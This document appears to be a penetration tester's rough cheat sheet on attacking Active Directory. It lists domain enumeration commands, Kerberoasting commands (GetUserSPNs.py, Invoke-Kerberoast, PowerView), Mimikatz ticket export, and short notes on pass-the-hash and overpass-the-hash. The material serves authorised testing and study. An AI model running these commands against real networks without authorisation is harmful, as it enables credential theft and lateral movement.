---
description: Rough notes on Active Directory
---

# Active Directory

### Active Directory

* You can perform post exploitation activities such as Kerberoasting with a machine account. This may be important if you cannot find another path to exploitation:
  * `GetUserSPNs.py -request 'DOMAIN/MACHINE$' -dc-ip DC -hashes 'LM:NTLM'`
* Basic Enumeration:
  * `net user` will enumerate all local accounts.
  * `net user /domain` will enumerate all users in the domain.
  * `net user [USER] /domain` will query the specified users.
  * `net group /domain` will list all groups in the domain.
  * `net accounts` will enumerate the domain account policy.
    * I strongly recommend using CrackMapExec or DomainPasswordSpray to perform any type of password spraying attack.
  * Run `klist` to see if there are any tickets stored in memory.
    * This can be performed with Mimikatz by running: `kerberos::list /export`&#x20;
      * These can then be cracked by using `tgsrepcrack.py` or your favorite password cracking tool.
* PowerView is your best friend when attempting to pivot. Run the following commands to get the lay of the land and perform exploitation activities.
  * `Get-NetLoggedOn -ComputerName [COMPUTER]` will return logged on users for the specified domain.
  * `Get-NetSession -ComputerName [DC]` can be useful to determine if a domain administrator has an active logon.
  * `Get-NetUser -SPN | select serviceprincipalname` Perform Kerberoasting with PowerView.
* Pass the Hash (PtH) utilizes NTLM hashes. I won't go deep into it here, however this can be accomplished with nearly every tool at your disposal
* Overpass the Hash allows us to utilize a users NTLM hash to obtain a Kerberos TGT or service ticket.&#x20;
  * After conducting this attack we can use any tooling that relies on Kerberos authentication rather than NTLM.&#x20;
    * PsExec is a great example of a tool that would benefit from this.
* Other attacks such as Silver Tickets and and Pass the Ticket have plenty of documentation online. Consult online guides when encountering this.
* [Another great Kerberoasting resource](https://stealthbits.com/blog/extracting-service-account-passwords-with-kerberoasting/)
*   [Invoke-Kerberoast](https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/)

    ```
    Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash
    ```

#### Get Domain Computers

* `Get-NetUser * -Domain corp.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset, lastlogontimestamp,accountexpires,admincount,userprincipalname, serviceprincipalname, mail,useraccountcontrol | Export-CSV users.csv`

#### Get Domain Computers

* `Get-NetComputer * -Domain corp.local | Select-Object -Property dnshostname,operatingsystem,operatingsystemservicepack,lastlogontimestamp | Export-CSV computers.csv`

#### SPN Ticket Request

* `Get-DomainUser * -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | Export-Csv .\ticket.csv -NoTypeInformation`
